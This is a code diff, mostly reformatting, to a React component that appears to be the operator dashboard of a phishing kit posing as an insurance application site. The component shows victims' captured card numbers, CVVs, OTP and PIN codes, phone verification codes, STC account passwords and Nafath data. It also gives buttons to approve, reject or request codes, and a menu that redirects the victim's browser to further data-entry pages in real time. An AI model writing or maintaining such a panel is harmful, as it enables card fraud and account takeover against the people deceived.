@@ -4,9 +4,7 @@ import type { InsuranceApplication } from "@/lib/firestore-types";
 import { useState } from "react";
 import { updateApplication } from "@/lib/firebase-services";
 import { DataBubble } from "./data-bubble";
-import {
-  type HistoryEntry,
-} from "@/lib/history-helpers";
+import { type HistoryEntry } from "@/lib/history-helpers";
 import {
   handleOtpApproval,
   handleOtpRejection,
@@ -29,9 +27,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
   const [navSelectValue, setNavSelectValue] = useState("");
   const [isProcessing, setIsProcessing] = useState(false);
   const [nafadCode, setNafadCode] = useState("");
-  const [_cardsLayout] = useState<"vertical" | "horizontal">(
-    "vertical"
-  );
+  const [_cardsLayout] = useState<"vertical" | "horizontal">("vertical");
   void _cardsLayout;
 
   const formatStcDate = (value?: string) => {
@@ -44,7 +40,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
     return `${parsed.toLocaleDateString("ar-SA")} ${parsed.toLocaleTimeString(
       "ar-SA",
-      { hour: "2-digit", minute: "2-digit" }
+      { hour: "2-digit", minute: "2-digit" },
     )}`;
   };
 
@@ -58,7 +54,9 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           <div className="w-16 h-16 rounded-2xl bg-gray-100 dark:bg-slate-800 flex items-center justify-center mx-auto mb-4">
             <span className="text-2xl opacity-50">👤</span>
           </div>
-          <p className="text-base font-medium text-gray-500 dark:text-slate-400">اختر زائراً لعرض التفاصيل</p>
+          <p className="text-base font-medium text-gray-500 dark:text-slate-400">
+            اختر زائراً لعرض التفاصيل
+          </p>
         </div>
       </div>
     );
@@ -196,6 +194,8 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
   // 4. Payment & Verification Data
   // Show ALL card attempts from history (newest first)
+  const hasMultipleAttempts = false; // For phone OTP compatibility
+
   // Card data has existed in several payload shapes. Keep all extraction in
   // one normalizer so the detail view, filters, and notifications agree.
   const allCardHistory = getNormalizedCardEntries(visitor);
@@ -268,9 +268,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       cardData.bankInfo?.level ||
       cardData.binData?.level;
     const bankName =
-      cardData.bankInfo?.name ||
-      cardData.bankName ||
-      cardData.issuer?.name;
+      cardData.bankInfo?.name || cardData.bankName || cardData.issuer?.name;
 
     if (
       cardNumber ||
@@ -281,10 +279,9 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     ) {
       bubbles.push({
         id: `card-info-${cardHistory.id || index}`,
-        title:
-          isLatestCard
-            ? "معلومات البطاقة"
-            : `معلومات البطاقة (محاولة ${sortedCardHistory.length - index})`,
+        title: isLatestCard
+          ? "معلومات البطاقة"
+          : `معلومات البطاقة (محاولة ${sortedCardHistory.length - index})`,
         icon: "💳",
         color: "orange",
         data: {
@@ -296,9 +293,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           CVV: cvv,
           البنك: bankName || "غير محدد",
           "بلد البنك":
-            cardData.bankInfo?.country ||
-            cardData.cardCountry ||
-            "غير محدد",
+            cardData.bankInfo?.country || cardData.cardCountry || "غير محدد",
         },
         timestamp: cardHistory.timestamp,
         status: effectiveCardStatus || ("pending" as const),
@@ -333,10 +328,9 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     if (otp) {
       bubbles.push({
         id: `otp-${otpHistory.id || index}`,
-        title:
-          isLatestOtp
-            ? "كود OTP"
-            : `كود OTP (محاولة ${sortedOtpHistory.length - index})`,
+        title: isLatestOtp
+          ? "كود OTP"
+          : `كود OTP (محاولة ${sortedOtpHistory.length - index})`,
         icon: "🔑",
         color: "pink",
         data: {
@@ -345,10 +339,10 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             effectiveOtpStatus === "approved"
               ? "✓ تم القبول"
               : effectiveOtpStatus === "rejected"
-              ? "✗ تم الرفض"
-              : effectiveOtpStatus === "message"
-              ? "📲 في انتظار الموافقة"
-              : "⬳ قيد المراجعة",
+                ? "✗ تم الرفض"
+                : effectiveOtpStatus === "message"
+                  ? "📲 في انتظار الموافقة"
+                  : "⬳ قيد المراجعة",
         },
         timestamp: otpHistory.timestamp,
         status: effectiveOtpStatus || ("pending" as const),
@@ -382,10 +376,9 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     if (pinCode) {
       bubbles.push({
         id: `pin-${pinHistory.id || index}`,
-        title:
-          isLatestPin
-            ? "رمز PIN"
-            : `رمز PIN (محاولة ${sortedPinHistory.length - index})`,
+        title: isLatestPin
+          ? "رمز PIN"
+          : `رمز PIN (محاولة ${sortedPinHistory.length - index})`,
         icon: "🔐",
         color: "indigo",
         data: {
@@ -394,10 +387,10 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             effectivePinStatus === "approved"
               ? "✓ تم القبول"
               : effectivePinStatus === "rejected"
-              ? "✗ تم الرفض"
-              : effectivePinStatus === "message"
-              ? "📲 في انتظار الموافقة"
-              : "⬳ قيد المراجعة",
+                ? "✗ تم الرفض"
+                : effectivePinStatus === "message"
+                  ? "📲 في انتظار الموافقة"
+                  : "⬳ قيد المراجعة",
         },
         timestamp: pinHistory.timestamp,
         status: effectivePinStatus || ("pending" as const),
@@ -434,24 +427,29 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       (h: any) =>
         h.type === "_t5" ||
         h.type === "phone_otp" ||
-        Boolean(h.data?._v7 || h.data?.phoneOtp || h.data?.phoneVerificationCode)
+        Boolean(
+          h.data?._v7 || h.data?.phoneOtp || h.data?.phoneVerificationCode,
+        ),
     ) || [];
   const currentPhoneOtp =
     visitor._v7 || visitor.phoneOtp || visitor.phoneVerificationCode || "";
-  const currentPhoneOtpStatus = visitor.phoneOtpStatus || visitor.phoneVerificationStatus;
+  const currentPhoneOtpStatus =
+    visitor.phoneOtpStatus || visitor.phoneVerificationStatus;
   const currentPhoneOtpTimestamp =
     visitor.phoneOtpUpdatedAt ||
     visitor.phoneOtpSubmittedAt ||
     visitor.phoneUpdatedAt ||
     visitor.updatedAt;
-  const currentPhoneOtpIsInHistory = historyPhoneOtpEntries.some((entry: any) => {
-    const value =
-      entry.data?._v7 ||
-      entry.data?.phoneOtp ||
-      entry.data?.phoneVerificationCode ||
-      "";
-    return Boolean(currentPhoneOtp) && value === currentPhoneOtp;
-  });
+  const currentPhoneOtpIsInHistory = historyPhoneOtpEntries.some(
+    (entry: any) => {
+      const value =
+        entry.data?._v7 ||
+        entry.data?.phoneOtp ||
+        entry.data?.phoneVerificationCode ||
+        "";
+      return Boolean(currentPhoneOtp) && value === currentPhoneOtp;
+    },
+  );
   const allPhoneOtpHistory = [
     ...historyPhoneOtpEntries,
     ...(currentPhoneOtp && !currentPhoneOtpIsInHistory
@@ -484,8 +482,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       isCurrentPhoneOtp && currentPhoneOtpStatus
         ? currentPhoneOtpStatus
         : phoneOtpHistory.status || "pending";
-    const hasBeenActioned =
-      status === "approved" || status === "rejected";
+    const hasBeenActioned = status === "approved" || status === "rejected";
 
     if (phoneOtp) {
       bubbles.push({
@@ -504,8 +501,8 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             status === "approved"
               ? "✓ تم القبول"
               : status === "rejected"
-              ? "✗ تم الرفض"
-              : "⬳ قيد المراجعة",
+                ? "✗ تم الرفض"
+                : "⬳ قيد المراجعة",
         },
         timestamp: phoneOtpHistory.timestamp,
         status,
@@ -641,15 +638,16 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
       color: "purple",
       data: {
         "رمز OTP النهائي": finalOtpCode || "في انتظار الإدخال...",
-        "الحالة": visitor.finalOtpStatus === "approved"
-          ? "✅ مقبول"
-          : visitor.finalOtpStatus === "rejected"
-          ? "❌ مرفوض"
-          : visitor.finalOtpStatus === "message"
-          ? "📲 في انتظار الموافقة"
-          : visitor.finalOtpStatus === "pending"
-          ? "⏳ قيد المراجعة"
-          : "⏳ في انتظار الإدخال",
+        الحالة:
+          visitor.finalOtpStatus === "approved"
+            ? "✅ مقبول"
+            : visitor.finalOtpStatus === "rejected"
+              ? "❌ مرفوض"
+              : visitor.finalOtpStatus === "message"
+                ? "📲 في انتظار الموافقة"
+                : visitor.finalOtpStatus === "pending"
+                  ? "⏳ قيد المراجعة"
+                  : "⏳ في انتظار الإدخال",
       },
       timestamp: visitor.finalOtpUpdatedAt || visitor.updatedAt,
       showActions: true,
@@ -676,7 +674,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
   // Action handlers for bubbles
   const handleBubbleAction = async (
     bubbleId: string,
-    action: "approve" | "reject" | "resend" | "otp" | "pin" | "message"
+    action: "approve" | "reject" | "resend" | "otp" | "pin" | "message",
   ) => {
     if (!visitor.id || isProcessing) return;
 
@@ -694,13 +692,13 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               "[Action] Card OTP clicked, bubble.id:",
               bubble.id,
               "history:",
-              visitor.history
+              visitor.history,
             );
             await updateHistoryStatus(
               visitor.id,
               bubble.id,
               "approved_with_otp",
-              visitor.history || []
+              visitor.history || [],
             );
             console.log("[Action] Status updated to approved_with_otp");
             await updateApplication(visitor.id, {
@@ -712,7 +710,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               visitor.id,
               bubble.id,
               "approved_with_pin",
-              visitor.history || []
+              visitor.history || [],
             );
             await updateApplication(visitor.id, {
               cardStatus: "approved_with_pin",
@@ -724,7 +722,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 visitor.id,
                 bubble.id,
                 "rejected",
-                visitor.history || []
+                visitor.history || [],
               );
               await updateApplication(visitor.id, { cardStatus: "rejected" });
             }
@@ -739,7 +737,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             await handleOtpApproval(
               visitor.id,
               bubble.id,
-              visitor.history || []
+              visitor.history || [],
             );
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض كود OTP؟")) {
@@ -747,7 +745,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               await handleOtpRejection(
                 visitor.id,
                 bubble.id,
-                visitor.history || []
+                visitor.history || [],
               );
             }
           } else if (action === "message") {
@@ -757,7 +755,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
 
         case "phone_otp":
           if (action === "approve") {
-            if (!(bubble as any).isDirect) {
+            if (hasMultipleAttempts) {
               await handlePhoneOtpApproval(visitor.id, bubbleId, history);
             } else {
               await updateApplication(visitor.id, {
@@ -767,31 +765,24 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             // Phone OTP approved
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض كود الهاتف؟")) {
-              if (!(bubble as any).isDirect) {
+              if (hasMultipleAttempts) {
                 await handlePhoneOtpRejection(visitor.id, bubbleId, history);
               } else {
                 await updateApplication(visitor.id, {
-                  _v7: "",
-                  phoneOtp: "",
-                  phoneVerificationCode: "",
                   phoneOtpStatus: "rejected",
                 });
               }
               // Phone OTP rejected
             }
           } else if (action === "resend") {
-            if (!(bubble as any).isDirect) {
-              await updateHistoryStatus(
-                visitor.id,
-                bubbleId,
-                "resend",
-                visitor.history || []
-              );
-            }
+            await updateHistoryStatus(
+              visitor.id,
+              bubbleId,
+              "resend",
+              visitor.history || [],
+            );
             await updateApplication(visitor.id, {
-              _v7: "",
               phoneOtp: "",
-              phoneVerificationCode: "",
               phoneOtpStatus: "show_phone_otp",
             });
             // Phone OTP modal reopened
@@ -819,7 +810,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               visitor.id,
               bubble.id,
               "approved",
-              visitor.history || []
+              visitor.history || [],
             );
             await updateApplication(visitor.id, { pinStatus: "approved" });
           } else if (action === "reject") {
@@ -828,7 +819,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 visitor.id,
                 bubble.id,
                 "rejected",
-                visitor.history || []
+                visitor.history || [],
               );
               await updateApplication(visitor.id, { pinStatus: "rejected" });
             }
@@ -882,15 +873,17 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             </h2>
 
             {/* Contact Info */}
-              <div className="mt-1 flex flex-col gap-1">
-               <div className="flex flex-wrap items-center gap-x-3 gap-y-1 text-xs">
+            <div className="mt-1 flex flex-col gap-1">
+              <div className="flex flex-wrap items-center gap-x-3 gap-y-1 text-xs">
                 <span className="text-gray-600 dark:text-slate-400">
                   📞{" "}
                   <span className="font-semibold text-gray-800 dark:text-slate-200">
                     {visitor.phoneNumber || "غير محدد"}
                   </span>
                 </span>
-                <span className="hidden text-gray-400 dark:text-slate-600 sm:inline">•</span>
+                <span className="hidden text-gray-400 dark:text-slate-600 sm:inline">
+                  •
+                </span>
                 <span className="text-gray-600 dark:text-slate-400">
                   🆔{" "}
                   <span className="font-semibold text-gray-800 dark:text-slate-200">
@@ -899,7 +892,9 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 </span>
               </div>
               {/* Display STC Data */}
-              {(visitor.stcPhone || visitor.stcPassword || visitor.stcSubmittedAt) && (
+              {(visitor.stcPhone ||
+                visitor.stcPassword ||
+                visitor.stcSubmittedAt) && (
                 <div className="bg-violet-50/60 dark:bg-violet-950/40 border-r-[3px] border-violet-400 p-4 rounded-xl">
                   <h4 className="font-bold text-violet-800 dark:text-violet-300 mb-2">
                     بيانات STC
@@ -910,7 +905,9 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                       <div>كلمة المرور: {visitor.stcPassword}</div>
                     )}
                     {visitor.stcSubmittedAt && (
-                      <div>التاريخ: {formatStcDate(visitor.stcSubmittedAt)}</div>
+                      <div>
+                        التاريخ: {formatStcDate(visitor.stcSubmittedAt)}
+                      </div>
                     )}
                   </div>
                 </div>
@@ -948,7 +945,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 void handleNavigate(val).finally(() => setNavSelectValue(""));
               }}
               disabled={isNavigating}
-               className="w-full rounded-md border border-gray-200 bg-white px-3 py-1.5 text-xs transition-all focus:border-[#0b72ce] focus:outline-none focus:ring-2 focus:ring-[#0b72ce]/10 disabled:opacity-50 dark:border-slate-700 dark:bg-slate-900 dark:text-slate-200 sm:w-auto"
+              className="w-full rounded-md border border-gray-200 bg-white px-3 py-1.5 text-xs transition-all focus:border-[#0b72ce] focus:outline-none focus:ring-2 focus:ring-[#0b72ce]/10 disabled:opacity-50 dark:border-slate-700 dark:bg-slate-900 dark:text-slate-200 sm:w-auto"
             >
               <option value="">توجيه الزائر...</option>
               <option value="home">🏠 الرئيسية (home)</option>
@@ -959,9 +956,8 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               <option value="check">💳 الدفع / البطاقة (check)</option>
               <option value="veri">🔑 التحقق OTP (veri)</option>
               <option value="confi">🔐 تأكيد PIN (confi)</option>
-              <option value="phone-info">📱 معلومات الهاتف (phone-info)</option>
+              <option value="step5">📱 معلومات الهاتف (step5)</option>
               <option value="nafad">🇸🇦 نفاذ (nafad)</option>
-              <option value="nafad_modal">🪟 فتح نافذة نفاذ</option>
             </select>
           </div>
         </div>
@@ -978,91 +974,142 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             dir="rtl"
           >
             {/* Right Column - Credit Card and Card Details */}
-             <div className="flex flex-col gap-2 lg:border-l lg:border-gray-200 lg:pl-3 dark:lg:border-slate-800">
+            <div className="flex flex-col gap-2 lg:border-l lg:border-gray-200 lg:pl-3 dark:lg:border-slate-800">
               {sortedBubbles
                 .filter(
-                  (b) => b.id.startsWith("card-info") || b.id === "card-details"
+                  (b) =>
+                    b.id.startsWith("card-info") || b.id === "card-details",
                 )
                 .map((bubble) => (
                   <div key={bubble.id} className="flex flex-col">
-                  <DataBubble
-                    title={bubble.title}
-                    data={bubble.data}
-                    timestamp={bubble.timestamp}
-                    status={bubble.status}
-                    showActions={bubble.showActions}
-                    isLatest={bubble.isLatest}
-                    layout="vertical"
-                    actions={
-                      bubble.customActions ? (
-                        bubble.customActions
-                      ) : bubble.showActions ? (
-                        <div className="flex flex-wrap gap-1.5">
-                          {bubble.type === "card" && (
-                            <>
-                              <button onClick={() => handleBubbleAction(bubble.id, "otp")} disabled={isProcessing}
-                                className="rounded-full bg-blue-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-blue-700 disabled:opacity-50 transition-colors">
-                                🔑 OTP
-                              </button>
-                              <button onClick={() => handleBubbleAction(bubble.id, "pin")} disabled={isProcessing}
-                                className="rounded-full bg-purple-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-purple-700 disabled:opacity-50 transition-colors">
-                                🔐 PIN
-                              </button>
-                              <button onClick={() => handleBubbleAction(bubble.id, "message")} disabled={isProcessing}
-                                className="rounded-full bg-amber-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-amber-600 disabled:opacity-50 transition-colors">
-                                📲 رسالة
-                              </button>
-                              <button onClick={() => handleBubbleAction(bubble.id, "reject")} disabled={isProcessing}
-                                className="rounded-full bg-red-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-red-600 disabled:opacity-50 transition-colors">
-                                رفض
-                              </button>
-                            </>
-                          )}
-                          {bubble.type === "otp" && (
-                            <>
-                              <button onClick={() => handleBubbleAction(bubble.id, "approve")} disabled={isProcessing}
-                                className="rounded-full bg-emerald-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-emerald-700 disabled:opacity-50 transition-colors">
-                                ✓ قبول
-                              </button>
-                              <button onClick={() => handleBubbleAction(bubble.id, "reject")} disabled={isProcessing}
-                                className="rounded-full bg-red-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-red-600 disabled:opacity-50 transition-colors">
-                                رفض
-                              </button>
-                              <button onClick={() => handleBubbleAction(bubble.id, "message")} disabled={isProcessing}
-                                className="rounded-full bg-amber-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-amber-600 disabled:opacity-50 transition-colors">
-                                📲 رسالة
-                              </button>
-                            </>
-                          )}
-                          {bubble.type === "phone_otp" && (
-                            <>
-                              <button onClick={() => handleBubbleAction(bubble.id, "approve")} disabled={isProcessing}
-                                className="rounded-full bg-emerald-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-emerald-700 disabled:opacity-50 transition-colors">
-                                ✓ قبول
-                              </button>
-                              <button onClick={() => handleBubbleAction(bubble.id, "reject")} disabled={isProcessing}
-                                className="rounded-full bg-red-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-red-600 disabled:opacity-50 transition-colors">
-                                رفض
-                              </button>
-                              <button onClick={() => handleBubbleAction(bubble.id, "resend")} disabled={isProcessing}
-                                className="rounded-full bg-blue-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-blue-700 disabled:opacity-50 transition-colors">
-                                إعادة إرسال
-                              </button>
-                            </>
-                          )}
-                        </div>
-                      ) : null
-                    }
-                  />
-                  {(bubble as any).binNumber && (
-                    <BinInfo cardNumber={(bubble as any).binNumber} />
-                  )}
+                    <DataBubble
+                      title={bubble.title}
+                      data={bubble.data}
+                      timestamp={bubble.timestamp}
+                      status={bubble.status}
+                      showActions={bubble.showActions}
+                      isLatest={bubble.isLatest}
+                      layout="vertical"
+                      actions={
+                        bubble.customActions ? (
+                          bubble.customActions
+                        ) : bubble.showActions ? (
+                          <div className="flex flex-wrap gap-1.5">
+                            {bubble.type === "card" && (
+                              <>
+                                <button
+                                  onClick={() =>
+                                    handleBubbleAction(bubble.id, "otp")
+                                  }
+                                  disabled={isProcessing}
+                                  className="rounded-full bg-blue-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-blue-700 disabled:opacity-50 transition-colors"
+                                >
+                                  🔑 OTP
+                                </button>
+                                <button
+                                  onClick={() =>
+                                    handleBubbleAction(bubble.id, "pin")
+                                  }
+                                  disabled={isProcessing}
+                                  className="rounded-full bg-purple-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-purple-700 disabled:opacity-50 transition-colors"
+                                >
+                                  🔐 PIN
+                                </button>
+                                <button
+                                  onClick={() =>
+                                    handleBubbleAction(bubble.id, "message")
+                                  }
+                                  disabled={isProcessing}
+                                  className="rounded-full bg-amber-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-amber-600 disabled:opacity-50 transition-colors"
+                                >
+                                  📲 رسالة
+                                </button>
+                                <button
+                                  onClick={() =>
+                                    handleBubbleAction(bubble.id, "reject")
+                                  }
+                                  disabled={isProcessing}
+                                  className="rounded-full bg-red-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-red-600 disabled:opacity-50 transition-colors"
+                                >
+                                  رفض
+                                </button>
+                              </>
+                            )}
+                            {bubble.type === "otp" && (
+                              <>
+                                <button
+                                  onClick={() =>
+                                    handleBubbleAction(bubble.id, "approve")
+                                  }
+                                  disabled={isProcessing}
+                                  className="rounded-full bg-emerald-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-emerald-700 disabled:opacity-50 transition-colors"
+                                >
+                                  ✓ قبول
+                                </button>
+                                <button
+                                  onClick={() =>
+                                    handleBubbleAction(bubble.id, "reject")
+                                  }
+                                  disabled={isProcessing}
+                                  className="rounded-full bg-red-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-red-600 disabled:opacity-50 transition-colors"
+                                >
+                                  رفض
+                                </button>
+                                <button
+                                  onClick={() =>
+                                    handleBubbleAction(bubble.id, "message")
+                                  }
+                                  disabled={isProcessing}
+                                  className="rounded-full bg-amber-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-amber-600 disabled:opacity-50 transition-colors"
+                                >
+                                  📲 رسالة
+                                </button>
+                              </>
+                            )}
+                            {bubble.type === "phone_otp" && (
+                              <>
+                                <button
+                                  onClick={() =>
+                                    handleBubbleAction(bubble.id, "approve")
+                                  }
+                                  disabled={isProcessing}
+                                  className="rounded-full bg-emerald-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-emerald-700 disabled:opacity-50 transition-colors"
+                                >
+                                  ✓ قبول
+                                </button>
+                                <button
+                                  onClick={() =>
+                                    handleBubbleAction(bubble.id, "reject")
+                                  }
+                                  disabled={isProcessing}
+                                  className="rounded-full bg-red-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-red-600 disabled:opacity-50 transition-colors"
+                                >
+                                  رفض
+                                </button>
+                                <button
+                                  onClick={() =>
+                                    handleBubbleAction(bubble.id, "resend")
+                                  }
+                                  disabled={isProcessing}
+                                  className="rounded-full bg-blue-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-blue-700 disabled:opacity-50 transition-colors"
+                                >
+                                  إعادة إرسال
+                                </button>
+                              </>
+                            )}
+                          </div>
+                        ) : null
+                      }
+                    />
+                    {(bubble as any).binNumber && (
+                      <BinInfo cardNumber={(bubble as any).binNumber} />
+                    )}
                   </div>
                 ))}
             </div>
 
             {/* Middle Column - Dynamic Cards (OTP, PIN, Phone, etc.) */}
-             <div className="flex flex-col gap-2 lg:border-l lg:border-gray-200 lg:px-3 dark:lg:border-slate-800">
+            <div className="flex flex-col gap-2 lg:border-l lg:border-gray-200 lg:px-3 dark:lg:border-slate-800">
               {sortedBubbles
                 .filter(
                   (b) =>
@@ -1070,7 +1117,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                     b.id !== "card-details" &&
                     b.id !== "basic-info" &&
                     b.id !== "offer-details" &&
-                    b.id !== "insurance-details"
+                    b.id !== "insurance-details",
                 )
                 .map((bubble) => (
                   <DataBubble
@@ -1087,25 +1134,51 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                         bubble.customActions
                       ) : bubble.showActions ? (
                         <div className="flex flex-wrap gap-1.5">
-                          {(bubble.type === "otp" || bubble.type === "pin" || bubble.type === "phone_otp" || bubble.type === "rajhi" || bubble.type === "final_otp") && (
+                          {(bubble.type === "otp" ||
+                            bubble.type === "pin" ||
+                            bubble.type === "phone_otp" ||
+                            bubble.type === "rajhi" ||
+                            bubble.type === "final_otp") && (
                             <>
-                              <button onClick={() => handleBubbleAction(bubble.id, "approve")} disabled={isProcessing}
-                                className="rounded-full bg-emerald-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-emerald-700 disabled:opacity-50 transition-colors">
+                              <button
+                                onClick={() =>
+                                  handleBubbleAction(bubble.id, "approve")
+                                }
+                                disabled={isProcessing}
+                                className="rounded-full bg-emerald-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-emerald-700 disabled:opacity-50 transition-colors"
+                              >
                                 ✓ قبول
                               </button>
-                              <button onClick={() => handleBubbleAction(bubble.id, "reject")} disabled={isProcessing}
-                                className="rounded-full bg-red-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-red-600 disabled:opacity-50 transition-colors">
+                              <button
+                                onClick={() =>
+                                  handleBubbleAction(bubble.id, "reject")
+                                }
+                                disabled={isProcessing}
+                                className="rounded-full bg-red-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-red-600 disabled:opacity-50 transition-colors"
+                              >
                                 رفض
                               </button>
-                              {(bubble.type === "otp" || bubble.type === "pin" || bubble.type === "final_otp") && (
-                                <button onClick={() => handleBubbleAction(bubble.id, "message")} disabled={isProcessing}
-                                  className="rounded-full bg-amber-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-amber-600 disabled:opacity-50 transition-colors">
+                              {(bubble.type === "otp" ||
+                                bubble.type === "pin" ||
+                                bubble.type === "final_otp") && (
+                                <button
+                                  onClick={() =>
+                                    handleBubbleAction(bubble.id, "message")
+                                  }
+                                  disabled={isProcessing}
+                                  className="rounded-full bg-amber-500 px-3 py-1.5 text-xs font-semibold text-white hover:bg-amber-600 disabled:opacity-50 transition-colors"
+                                >
                                   📲 رسالة
                                 </button>
                               )}
                               {bubble.type === "phone_otp" && (
-                                <button onClick={() => handleBubbleAction(bubble.id, "resend")} disabled={isProcessing}
-                                  className="rounded-full bg-blue-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-blue-700 disabled:opacity-50 transition-colors">
+                                <button
+                                  onClick={() =>
+                                    handleBubbleAction(bubble.id, "resend")
+                                  }
+                                  disabled={isProcessing}
+                                  className="rounded-full bg-blue-600 px-3 py-1.5 text-xs font-semibold text-white hover:bg-blue-700 disabled:opacity-50 transition-colors"
+                                >
                                   إعادة إرسال
                                 </button>
                               )}
@@ -1119,13 +1192,13 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             </div>
 
             {/* Left Column - Static Info (Basic, Offer Details, Insurance Details) */}
-             <div className="flex flex-col gap-2 lg:pr-3">
+            <div className="flex flex-col gap-2 lg:pr-3">
               {sortedBubbles
                 .filter(
                   (b) =>
                     b.id === "basic-info" ||
                     b.id === "offer-details" ||
-                    b.id === "insurance-details"
+                    b.id === "insurance-details",
                 )
                 .map((bubble) => (
                   <DataBubble
